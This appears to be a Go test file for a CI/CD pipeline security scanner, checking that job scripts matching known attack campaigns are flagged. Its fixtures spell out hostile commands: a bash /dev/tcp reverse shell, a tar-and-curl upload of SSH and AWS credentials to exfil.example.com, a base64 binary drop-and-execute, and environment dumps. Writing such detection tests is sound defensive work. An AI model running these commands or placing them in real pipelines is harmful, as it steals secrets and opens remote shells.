package analyze

import (
	"testing"

	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
)

func TestCampaign_HadesStyle(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "code-format",
			Script: []string{"printenv > format-results.txt"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("expected %s finding for Hades-style campaign, got: %+v", CampaignMatchID, findingIDs(findings))
	}
}

func TestCampaign_WormPropagation(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "propagate",
			Script: []string{"git clone https://gitlab.com/org/sibling.git", "cd sibling", "git push origin main"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("expected %s finding for worm propagation", CampaignMatchID)
	}
}

func TestCampaign_BinaryDropAndExec(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "build",
			Script: []string{"echo 'payload' | base64 -d > /tmp/bin", "chmod +x /tmp/bin", "/tmp/bin"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("expected %s finding for binary drop-and-execute", CampaignMatchID)
	}
}

func TestCampaign_ReverseShell(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "debug",
			Script: []string{`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("expected %s finding for reverse shell", CampaignMatchID)
	}
}

func TestCampaign_CredentialHarvest(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "backup",
			Script: []string{"tar czf /tmp/creds.tar.gz ~/.ssh/id_rsa ~/.aws/credentials", "curl -F file=@/tmp/creds.tar.gz https://exfil.example.com"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("expected %s finding for credential harvesting", CampaignMatchID)
	}
}

func TestCampaign_NoFalsePositive_NormalJob(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "test",
			Script: []string{"go test ./...", "echo 'done'"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("did not expect %s finding for normal test job", CampaignMatchID)
	}
}

func TestCampaign_MegalodonStyle(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "sysdiag",
			Script: []string{"printenv > /tmp/diag.txt"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("expected %s finding for Megalodon-style campaign", CampaignMatchID)
	}
}
